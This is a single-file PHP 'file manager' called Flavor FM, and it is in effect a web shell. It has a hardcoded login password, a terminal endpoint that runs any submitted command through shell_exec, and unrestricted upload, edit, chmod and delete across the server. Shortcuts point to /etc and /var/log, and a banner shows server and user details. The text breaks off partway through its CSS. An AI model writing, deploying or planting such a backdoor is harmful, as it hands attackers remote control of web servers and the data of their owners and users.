<?php
/**
 * ══════════════════════════════════════════════════════
 *  FLAVOR FM v2.0 — PHP File Manager
 *  Single-file, CodeMirror editor, Terminal, Search
 *  Copy/Cut/Paste, Multi-select, Zip/Extract
 * ══════════════════════════════════════════════════════
 */

error_reporting(E_ALL);
ini_set('display_errors', '1');

if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

// ─── CONFIG ────────────────────────────────────
define('APP_NAME', 'Flavor FM');
define('APP_VERSION', '2.0');
define('DATE_FORMAT', 'Y-m-d H:i:s');
define('MAX_UPLOAD_SIZE', 100 * 1024 * 1024);
define('FM_PASSWORD', 'mumet69');

// ─── AUTH ──────────────────────────────────────
function check_login(): bool {
    return isset($_SESSION['fm_logged_in']) && $_SESSION['fm_logged_in'] === true;
}

if (isset($_POST['action']) && $_POST['action'] === 'login') {
    if (($_POST['password'] ?? '') === FM_PASSWORD) {
        $_SESSION['fm_logged_in'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = 'Password salah!';
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!check_login()) {
    show_login($login_error ?? null);
    exit;
}

// ─── DEFAULT DIR ───────────────────────────────
function detect_home_dir(): string {
    $candidates = [
        $_SERVER['DOCUMENT_ROOT'] ?? '',
        '/home/' . @get_current_user() . '/public_html',
        '/var/www/html',
        __DIR__,
    ];
    foreach ($candidates as $c) {
        if ($c && is_dir($c)) return realpath($c);
    }
    return '/';
}
define('HOME_DIR', detect_home_dir());

// ─── HELPERS ───────────────────────────────────
function safe_path(string $path): string {
    $real = realpath($path);
    return ($real === false) ? HOME_DIR : $real;
}

function human_size(int $bytes): string {
    if ($bytes == 0) return '0 B';
    $units = ['B','KB','MB','GB','TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < 4) { $bytes /= 1024; $i++; }
    return round($bytes, 2) . ' ' . $units[$i];
}

function icon_for(string $name, bool $is_dir): string {
    if ($is_dir) return '📁';
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $map = [
        'php'=>'🐘','html'=>'🌐','htm'=>'🌐','css'=>'🎨','js'=>'⚡',
        'json'=>'📋','xml'=>'📰','sql'=>'🗄️','md'=>'📝','txt'=>'📄',
        'jpg'=>'🖼️','jpeg'=>'🖼️','png'=>'🖼️','gif'=>'🖼️','svg'=>'🖼️','webp'=>'🖼️','ico'=>'🖼️',
        'mp4'=>'🎬','avi'=>'🎬','mkv'=>'🎬','mp3'=>'🎵','wav'=>'🎵','flac'=>'🎵',
        'zip'=>'📦','rar'=>'📦','gz'=>'📦','tar'=>'📦','7z'=>'📦','bz2'=>'📦',
        'pdf'=>'📕','doc'=>'📘','docx'=>'📘','xls'=>'📗','xlsx'=>'📗','pptx'=>'📙',
        'py'=>'🐍','rb'=>'💎','go'=>'🔵','rs'=>'🦀','java'=>'☕','sh'=>'🖥️','bat'=>'🖥️',
        'env'=>'🔒','log'=>'📜','yml'=>'⚙️','yaml'=>'⚙️','ini'=>'⚙️','conf'=>'⚙️',
        'db'=>'🗃️','sqlite'=>'🗃️',
    ];
    return $map[$ext] ?? '📄';
}

function is_editable(string $name): bool {
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $editable = ['php','html','htm','css','js','json','xml','sql','md','txt','py',
                 'rb','go','rs','java','sh','env','log','yml','yaml','ini','conf',
                 'htaccess','gitignore','csv','tsv','tpl','twig','vue','jsx','tsx',
                 'ts','c','cpp','h','bat','ps1','lua','pl','r','scss','sass','less',
                 'dockerfile','makefile','toml','cfg','properties'];
    return in_array($ext, $editable) || $ext === '' || strpos($name, '.') === false;
}

function cm_mode(string $name): string {
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $modes = [
        'php'=>'php','html'=>'htmlmixed','htm'=>'htmlmixed','css'=>'css',
        'js'=>'javascript','json'=>'javascript','ts'=>'javascript','jsx'=>'jsx',
        'tsx'=>'jsx','vue'=>'vue','xml'=>'xml','svg'=>'xml',
        'sql'=>'sql','py'=>'python','rb'=>'ruby','go'=>'go','rs'=>'rust',
        'java'=>'clike','c'=>'clike','cpp'=>'clike','h'=>'clike',
        'sh'=>'shell','bat'=>'shell','ps1'=>'powershell',
        'md'=>'markdown','yml'=>'yaml','yaml'=>'yaml',
        'lua'=>'lua','pl'=>'perl','r'=>'r','scss'=>'css','sass'=>'css','less'=>'css',
        'dockerfile'=>'dockerfile','toml'=>'toml',
    ];
    return $modes[$ext] ?? 'text';
}

function flash(string $type, string $msg): void {
    $_SESSION['flash'] = ['type' => $type, 'msg' => $msg];
}

function get_flash(): ?array {
    if (isset($_SESSION['flash'])) {
        $f = $_SESSION['flash'];
        unset($_SESSION['flash']);
        return $f;
    }
    return null;
}

function recursive_delete(string $path): bool {
    if (is_file($path) || is_link($path)) return @unlink($path);
    if (is_dir($path)) {
        $it = new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS);
        $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($files as $f) {
            $f->isDir() ? @rmdir($f->getRealPath()) : @unlink($f->getRealPath());
        }
        return @rmdir($path);
    }
    return false;
}

function recursive_copy(string $src, string $dst): bool {
    if (is_file($src)) return @copy($src, $dst);
    if (!is_dir($dst)) @mkdir($dst, 0755, true);
    $dir = opendir($src);
    while (($file = readdir($dir)) !== false) {
        if ($file === '.' || $file === '..') continue;
        recursive_copy($src . '/' . $file, $dst . '/' . $file);
    }
    closedir($dir);
    return true;
}

// ─── CURRENT DIR ───────────────────────────────
$dir = isset($_GET['dir']) ? $_GET['dir'] : HOME_DIR;
$dir = safe_path($dir);

// ─── AJAX: Terminal ────────────────────────────
if (isset($_POST['action']) && $_POST['action'] === 'terminal' && isset($_POST['cmd'])) {
    header('Content-Type: application/json');
    $cmd = $_POST['cmd'];
    $cwd = $_POST['cwd'] ?? $dir;
    if (!is_dir($cwd)) $cwd = $dir;
    $fullcmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
    $output = @shell_exec($fullcmd);
    echo json_encode(['output' => $output ?? 'Command execution not available', 'cwd' => $cwd]);
    exit;
}

// ─── AJAX: Search ──────────────────────────────
if (isset($_POST['action']) && $_POST['action'] === 'search') {
    header('Content-Type: application/json');
    $query = $_POST['query'] ?? '';
    $search_dir = $_POST['search_dir'] ?? $dir;
    $search_content = !empty($_POST['search_content']);
    $results = [];

    if (strlen($query) >= 2) {
        // Search filenames
        $cmd = 'find ' . escapeshellarg($search_dir) . ' -maxdepth 5 -iname ' . escapeshellarg('*' . $query . '*') . ' 2>/dev/null | head -50';
        $output = @shell_exec($cmd);
        if ($output) {
            foreach (explode("\n", trim($output)) as $line) {
                if ($line) {
                    $results[] = [
                        'path' => $line,
                        'name' => basename($line),
                        'dir'  => dirname($line),
                        'is_dir' => is_dir($line),
                        'type' => 'filename',
                    ];
                }
            }
        }

        // Search content with grep
        if ($search_content) {
            $cmd2 = 'grep -ril --include="*.{php,html,htm,css,js,json,xml,txt,md,py,sh,conf,yml,yaml,sql,env,log}" ' . escapeshellarg($query) . ' ' . escapeshellarg($search_dir) . ' 2>/dev/null | head -30';
            $output2 = @shell_exec($cmd2);
            if ($output2) {
                foreach (explode("\n", trim($output2)) as $line) {
                    if ($line && !in_array($line, array_column($results, 'path'))) {
                        $results[] = [
                            'path' => $line,
                            'name' => basename($line),
                            'dir'  => dirname($line),
                            'is_dir' => false,
                            'type' => 'content',
                        ];
                    }
                }
            }
        }
    }
    echo json_encode(['results' => $results]);
    exit;
}

// ─── POST ACTIONS ──────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    // Upload
    if ($action === 'upload' && !empty($_FILES['files'])) {
        $count = 0;
        foreach ($_FILES['files']['tmp_name'] as $i => $tmp) {
            if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) {
                $name = basename($_FILES['files']['name'][$i]);
                move_uploaded_file($tmp, $dir . '/' . $name);
                $count++;
            }
        }
        flash('success', "$count file(s) uploaded.");
    }

    // Create folder
    if ($action === 'mkdir' && !empty($_POST['name'])) {
        $name = basename($_POST['name']);
        $target = $dir . '/' . $name;
        if (!file_exists($target)) { @mkdir($target, 0755, true); flash('success', "Folder \"$name\" created."); }
        else { flash('error', "\"$name\" already exists."); }
    }

    // Create file
    if ($action === 'mkfile' && !empty($_POST['name'])) {
        $name = basename($_POST['name']);
        $target = $dir . '/' . $name;
        if (!file_exists($target)) { @file_put_contents($target, ''); flash('success', "File \"$name\" created."); }
        else { flash('error', "\"$name\" already exists."); }
    }

    // Rename
    if ($action === 'rename' && !empty($_POST['old']) && !empty($_POST['new'])) {
        $old = $dir . '/' . basename($_POST['old']);
        $new = $dir . '/' . basename($_POST['new']);
        if (file_exists($old) && !file_exists($new)) { @rename($old, $new); flash('success', "Renamed."); }
        else { flash('error', "Rename failed."); }
    }

    // Delete single
    if ($action === 'delete' && !empty($_POST['target'])) {
        $target = safe_path($dir . '/' . basename($_POST['target']));
        if ($target !== '/') { recursive_delete($target); flash('success', "Deleted."); }
    }

    // Delete multiple
    if ($action === 'delete_multi' && !empty($_POST['items'])) {
        $items = json_decode($_POST['items'], true);
        $count = 0;
        foreach ($items as $item) {
            $target = safe_path($dir . '/' . basename($item));
            if ($target !== '/' && recursive_delete($target)) $count++;
        }
        flash('success', "$count item(s) deleted.");
    }

    // Copy to clipboard (session)
    if ($action === 'clipboard' && !empty($_POST['items']) && !empty($_POST['op'])) {
        $_SESSION['clipboard'] = [
            'items' => json_decode($_POST['items'], true),
            'dir'   => $dir,
            'op'    => $_POST['op'], // 'copy' or 'cut'
        ];
        $op_label = $_POST['op'] === 'cut' ? 'Cut' : 'Copied';
        $count = count(json_decode($_POST['items'], true));
        flash('success', "$op_label $count item(s) to clipboard.");
    }

    // Paste from clipboard
    if ($action === 'paste' && !empty($_SESSION['clipboard'])) {
        $cb = $_SESSION['clipboard'];
        $count = 0;
        foreach ($cb['items'] as $item) {
            $src = rtrim($cb['dir'], '/') . '/' . basename($item);
            $dst = rtrim($dir, '/') . '/' . basename($item);
            if (!file_exists($src)) continue;
            // Avoid overwrite
            if (file_exists($dst)) {
                $info = pathinfo($dst);
                $dst = $info['dirname'] . '/' . $info['filename'] . '_copy' . (isset($info['extension']) ? '.' . $info['extension'] : '');
            }
            if ($cb['op'] === 'copy') {
                recursive_copy($src, $dst);
                $count++;
            } else {
                @rename($src, $dst);
                $count++;
            }
        }
        if ($cb['op'] === 'cut') unset($_SESSION['clipboard']);
        flash('success', "Pasted $count item(s).");
    }

    // Save file (editor)
    if ($action === 'save' && isset($_POST['filepath']) && isset($_POST['content'])) {
        $fp = safe_path($_POST['filepath']);
        @file_put_contents($fp, $_POST['content']);
        flash('success', "File saved.");
    }

    // Chmod
    if ($action === 'chmod' && !empty($_POST['target']) && !empty($_POST['perms'])) {
        $target = safe_path($dir . '/' . basename($_POST['target']));
        if (@chmod($target, octdec($_POST['perms']))) { flash('success', "Permissions changed."); }
        else { flash('error', "Failed to change permissions."); }
    }

    // Zip files
    if ($action === 'zip' && !empty($_POST['items'])) {
        $items = json_decode($_POST['items'], true);
        $zipname = 'archive_' . date('Ymd_His') . '.zip';
        $zippath = $dir . '/' . $zipname;
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($zippath, ZipArchive::CREATE) === true) {
                foreach ($items as $item) {
                    $full = rtrim($dir, '/') . '/' . basename($item);
                    if (is_file($full)) {
                        $zip->addFile($full, basename($item));
                    } elseif (is_dir($full)) {
                        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($full, RecursiveDirectoryIterator::SKIP_DOTS));
                        foreach ($it as $file) {
                            $rel = basename($item) . '/' . $it->getSubPathname();
                            $zip->addFile($file->getRealPath(), $rel);
                        }
                    }
                }
                $zip->close();
                flash('success', "Created $zipname");
            }
        } else {
            flash('error', "ZipArchive not available on this server.");
        }
    }

    // Extract zip
    if ($action === 'extract' && !empty($_POST['target'])) {
        $target = safe_path($dir . '/' . basename($_POST['target']));
        if (class_exists('ZipArchive') && is_file($target)) {
            $zip = new ZipArchive();
            $folder = $dir . '/' . pathinfo($target, PATHINFO_FILENAME);
            if ($zip->open($target) === true) {
                @mkdir($folder, 0755, true);
                $zip->extractTo($folder);
                $zip->close();
                flash('success', "Extracted to " . basename($folder));
            } else {
                flash('error', "Failed to extract.");
            }
        }
    }

    // Go to path
    if ($action === 'goto' && !empty($_POST['path'])) {
        $goto = realpath($_POST['path']);
        if ($goto && is_dir($goto)) { header('Location: ?dir=' . urlencode($goto)); exit; }
        else { flash('error', "Path not found."); }
    }

    if ($action !== 'terminal' && $action !== 'search') {
        header('Location: ?dir=' . urlencode($dir));
        exit;
    }
}

// ─── DOWNLOAD ──────────────────────────────────
if (isset($_GET['download'])) {
    $file = safe_path($dir . '/' . basename($_GET['download']));
    if (is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// ─── EDIT MODE ─────────────────────────────────
$editing = false; $edit_content = ''; $edit_file = ''; $edit_mode = 'text';
if (isset($_GET['edit'])) {
    $ef = safe_path($dir . '/' . basename($_GET['edit']));
    if (is_file($ef) && is_editable(basename($ef))) {
        $editing = true;
        $edit_file = $ef;
        $edit_content = file_get_contents($ef);
        $edit_mode = cm_mode(basename($ef));
    }
}

// ─── VIEW MODE (images, pdf) ───────────────────
$viewing = false; $view_file = ''; $view_type = '';
if (isset($_GET['view'])) {
    $vf = safe_path($dir . '/' . basename($_GET['view']));
    if (is_file($vf)) {
        $ext = strtolower(pathinfo($vf, PATHINFO_EXTENSION));
        if (in_array($ext, ['jpg','jpeg','png','gif','svg','webp','ico','bmp'])) {
            $viewing = true; $view_file = $vf; $view_type = 'image';
        } elseif ($ext === 'pdf') {
            $viewing = true; $view_file = $vf; $view_type = 'pdf';
        }
    }
}

// Serve image/pdf for preview
if (isset($_GET['preview'])) {
    $pf = safe_path($dir . '/' . basename($_GET['preview']));
    if (is_file($pf)) {
        $ext = strtolower(pathinfo($pf, PATHINFO_EXTENSION));
        $mimes = ['jpg'=>'image/jpeg','jpeg'=>'image/jpeg','png'=>'image/png','gif'=>'image/gif',
                   'svg'=>'image/svg+xml','webp'=>'image/webp','ico'=>'image/x-icon','bmp'=>'image/bmp',
                   'pdf'=>'application/pdf'];
        if (isset($mimes[$ext])) {
            header('Content-Type: ' . $mimes[$ext]);
            header('Content-Length: ' . filesize($pf));
            readfile($pf);
            exit;
        }
    }
}

// ─── READ DIRECTORY ────────────────────────────
$items = [];
if (is_dir($dir) && !$editing && !$viewing) {
    $scan = @scandir($dir);
    if ($scan) {
        foreach ($scan as $entry) {
            if ($entry === '.' || $entry === '..') continue;
            $full = rtrim($dir, '/') . '/' . $entry;
            $items[] = [
                'name'  => $entry,
                'path'  => $full,
                'is_dir'=> is_dir($full),
                'size'  => @is_file($full) ? @filesize($full) : 0,
                'mtime' => @filemtime($full) ?: 0,
                'perms' => substr(sprintf('%o', @fileperms($full)), -4),
                'owner' => (function_exists('posix_getpwuid') && function_exists('fileowner')) ? (@posix_getpwuid(@fileowner($full))['name'] ?? '-') : '-',
            ];
        }
    }
    usort($items, function($a, $b) {
        if ($a['is_dir'] && !$b['is_dir']) return -1;
        if (!$a['is_dir'] && $b['is_dir']) return 1;
        return strcasecmp($a['name'], $b['name']);
    });
}

// Breadcrumbs
function build_breadcrumbs(string $p): array {
    $c = [['name'=>'/','path'=>'/']];
    if ($p === '/') return $c;
    $parts = array_filter(explode('/', $p));
    $b = '';
    foreach ($parts as $x) { $b .= '/' . $x; $c[] = ['name'=>$x,'path'=>$b]; }
    return $c;
}

$crumbs = build_breadcrumbs($dir);
$parent_dir = dirname($dir);
$flash = get_flash();
$has_clipboard = !empty($_SESSION['clipboard']);
$clipboard_count = $has_clipboard ? count($_SESSION['clipboard']['items']) : 0;
$clipboard_op = $has_clipboard ? $_SESSION['clipboard']['op'] : '';

// Bookmarks
$bookmarks = [];
$bm_list = [
    '🏠 Home' => HOME_DIR, '/ Root' => '/',
    '📂 public_html' => '/home/' . @get_current_user() . '/public_html',
    '⚙️ etc' => '/etc', '📁 tmp' => '/tmp', '📁 var/log' => '/var/log',
];
foreach ($bm_list as $l => $p) { if (is_dir($p)) $bookmarks[$l] = realpath($p); }

$server_info = [
    'PHP' => PHP_VERSION,
    'Server' => $_SERVER['SERVER_SOFTWARE'] ?? 'CLI',
    'OS' => PHP_OS,
    'User' => (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) ? (@posix_getpwuid(@posix_geteuid())['name'] ?? @get_current_user()) : @get_current_user(),
];

// ═══════════════════════════════════════════════
function show_login(?string $error): void {
?>
<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?= APP_NAME ?> — Login</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{--bg:#0c0e14;--surface:#13161f;--border:#262a36;--text:#e2e8f0;--text2:#64748b;--accent:#6366f1;--accent2:#22d3ee;--danger:#ef4444;--font:'DM Sans',sans-serif;--mono:'JetBrains Mono',monospace}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:var(--font);background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;background-image:radial-gradient(ellipse at 20% 50%,rgba(99,102,241,.08),transparent 50%),radial-gradient(ellipse at 80% 50%,rgba(34,211,238,.06),transparent 50%)}
.login-box{background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:48px 40px;width:380px;text-align:center;animation:fadeIn .5s ease;box-shadow:0 24px 48px rgba(0,0,0,.3)}
@keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
.login-box h1{font-size:28px;margin-bottom:4px;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.login-box .ver{font-size:11px;color:var(--text2);font-family:var(--mono);margin-bottom:24px}
.login-box p{color:var(--text2);font-size:13px;margin-bottom:28px}
.login-box input[type="password"]{width:100%;padding:14px 18px;font-family:var(--mono);font-size:15px;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:10px;margin-bottom:18px;text-align:center;letter-spacing:4px;transition:border .2s}
.login-box input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px rgba(99,102,241,.2)}
.login-box button{width:100%;padding:14px;font-family:var(--font);font-size:15px;font-weight:600;border:none;background:linear-gradient(135deg,var(--accent),#8b5cf6);color:#fff;border-radius:10px;cursor:pointer;transition:all .2s}
.login-box button:hover{transform:translateY(-1px);box-shadow:0 8px 24px rgba(99,102,241,.3)}
.error{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:var(--danger);padding:12px;border-radius:10px;margin-bottom:18px;font-size:13px}
</style></head><body>
<div class="login-box">
    <h1>⚡ <?= APP_NAME ?></h1>
    <div class="ver">v<?= APP_VERSION ?></div>
    <p>Enter password to continue</p>
    <?php if ($error): ?><div class="error"><?= htmlspecialchars($error) ?></div><?php endif; ?>
    <form method="POST">
        <input type="hidden" name="action" value="login">
        <input type="password" name="password" placeholder="••••••••" autofocus required>
        <button type="submit">🔓 Login</button>
    </form>
</div>
</body></html>
<?php exit; } ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?= APP_NAME ?> — <?= htmlspecialchars($dir) ?></title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,600;1,400&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<!-- CodeMirror -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/codemirror.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/theme/dracula.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/fold/foldgutter.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/hint/show-hint.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/codemirror.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/edit/matchbrackets.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/edit/closebrackets.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/edit/closetag.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/fold/foldcode.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/fold/foldgutter.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/fold/brace-fold.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/fold/xml-fold.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/fold/comment-fold.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/search/search.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/search/searchcursor.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/dialog/dialog.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/dialog/dialog.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/addon/hint/show-hint.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/xml/xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/javascript/javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/css/css.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/htmlmixed/htmlmixed.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/clike/clike.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/php/php.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/python/python.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/ruby/ruby.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/shell/shell.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/sql/sql.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/markdown/markdown.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/yaml/yaml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/go/go.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/rust/rust.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/lua/lua.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/perl/perl.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/dockerfile/dockerfile.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/toml/toml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/vue/vue.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.18/mode/jsx/jsx.min.js"></script>
<style>
:root{
    --bg:#0c0e14;--surface:#13161f;--surface2:#1a1e2a;--border:#262a36;--border-hl:#6366f1;
    --text:#e2e8f0;--text2:#64748b;--accent:#6366f1;--accent2:#22d3ee;--accent3:#a78bfa;
    --success:#22c55e;--danger:#ef4444;--warning:#eab308;
    --font:'DM Sans',sans-serif;--mono:'JetBrains Mono',monospace;--radius:8px;
}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:var(--font);background:var(--bg);color:var(--text);min-height:100vh}
::selection{background:rgba(99,102,241,.3)}

/* TOPBAR */
.topbar{background:var(--surface);border-bottom:1px solid var(--border);padding:10px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
.topbar h1{font-size:17px;font-weight:700;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.topbar h1 small{font-size:10px;font-weight:400;-webkit-text-fill-color:var(--text2)}
.topbar-right{display:flex;align-items:center;gap:12px}
.server-info{display:flex;gap:12px;font-size:10px;color:var(--text2);font-family:var(--mono)}
.server-info b{color:var(--text);font-weight:600}
.logout-btn{font-size:11px;font-weight:600;padding:5px 12px;border:1px solid var(--danger);background:transparent;color:var(--danger);border-radius:6px;cursor:pointer;text-decoration:none;transition:.15s}
.logout-btn:hover{background:rgba(239,68,68,.1)}

/* PATH BAR */
.path-bar{background:var(--surface);border-bottom:1px solid var(--border);padding:8px 20px;display:flex;align-items:center;gap:6px}
.path-bar form{display:flex;flex:1;gap:6px}
.path-bar input{flex:1;padding:7px 12px;font-family:var(--mono);font-size:12px;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:6px}
.path-bar input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 2px rgba(99,102,241,.15)}
.pbtn{font-family:var(--font);font-size:11px;font-weight:600;padding:7px 12px;border:1px solid var(--border);background:var(--surface2);color:var(--text);border-radius:6px;cursor:pointer;white-space:nowrap;transition:.15s;text-decoration:none}
.pbtn:hover{border-color:var(--accent);color:var(--accent)}
.pbtn.up{color:var(--accent2);border-color:var(--accent2)}
.pbtn.up:hover{background:rgba(34,211,238,.08)}

/* BREADCRUMBS */
.breadcrumbs{padding:6px 20px;display:flex;align-items:center;gap:2px;font-size:12px;border-bottom:1px solid var(--border);background:var(--surface);flex-wrap:wrap}
.breadcrumbs a{color:var(--accent);text-decoration:none;padding:3px 5px;border-radius:3px;transition:.15s}
.breadcrumbs a:hover{background:rgba(99,102,241,.1)}
.breadcrumbs .sep{color:var(--text2);font-size:10px}
.breadcrumbs .cur{color:var(--text);font-weight:600;padding:3px 5px}

/* BOOKMARKS */
.bookmarks{padding:6px 20px;display:flex;gap:5px;flex-wrap:wrap;border-bottom:1px solid var(--border);background:var(--surface)}
.bookmarks a{font-size:11px;font-weight:500;padding:4px 10px;border:1px solid var(--border);background:var(--bg);color:var(--text2);border-radius:14px;text-decoration:none;transition:.15s}
.bookmarks a:hover{border-color:var(--accent);color:var(--accent)}
.bookmarks a.act{border-color:var(--accent);color:var(--accent);background:rgba(99,102,241,.06)}

/* TAB BAR */
.tab-bar{display:flex;border-bottom:1px solid var(--border);background:var(--surface)}
.tab-btn{font-family:var(--font);font-size:12px;font-weight:600;padding:10px 20px;border:none;background:transparent;color:var(--text2);cursor:pointer;border-bottom:2px solid transparent;transition:.15s}
.tab-btn:hover{color:var(--text);background:var(--surface2)}
.tab-btn.active{color:var(--accent);border-bottom-color:var(--accent)}

/* FLASH */
.flash{margin:12px 20px 0;padding:10px 14px;border-radius:var(--radius);font-size:13px;font-weight:500;animation:slideIn .3s}
.flash.success{background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.25);color:var(--success)}
.flash.error{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.25);color:var(--danger)}
@keyframes slideIn{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:translateY(0)}}

/* TOOLBAR */
.toolbar{padding:12px 20px;display:flex;gap:6px;flex-wrap:wrap;align-items:center}
.tbtn{font-family:var(--font);font-size:12px;font-weight:600;padding:7px 14px;border:1px solid var(--border);background:var(--surface);color:var(--text);border-radius:var(--radius);cursor:pointer;transition:.15s;display:inline-flex;align-items:center;gap:5px}
.tbtn:hover{border-color:var(--accent);background:var(--surface2)}
.tbtn.green{border-color:var(--success);color:var(--success)}
.tbtn.green:hover{background:rgba(34,197,94,.08)}
.tbtn.cyan{border-color:var(--accent2);color:var(--accent2)}
.tbtn.cyan:hover{background:rgba(34,211,238,.08)}
.tbtn.purple{border-color:var(--accent3);color:var(--accent3)}
.tbtn.purple:hover{background:rgba(167,139,250,.08)}
.tbtn.red{border-color:var(--danger);color:var(--danger)}
.tbtn.red:hover{background:rgba(239,68,68,.08)}
.toolbar .sep{width:1px;height:24px;background:var(--border);margin:0 4px}
.clipboard-info{font-size:11px;color:var(--accent3);font-family:var(--mono);padding:4px 10px;background:rgba(167,139,250,.08);border-radius:4px}

/* TABLE */
.table-wrap{padding:0 20px 20px;overflow-x:auto}
table{width:100%;border-collapse:collapse;font-size:13px}
thead th{text-align:left;padding:8px 10px;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:var(--text2);border-bottom:2px solid var(--border)}
tbody tr{border-bottom:1px solid var(--border);transition:.1s}
tbody tr:hover{background:var(--surface2)}
tbody tr.selected{background:rgba(99,102,241,.08);border-left:3px solid var(--accent)}
td{padding:8px 10px}
td.name-col{word-break:break-all;max-width:380px}
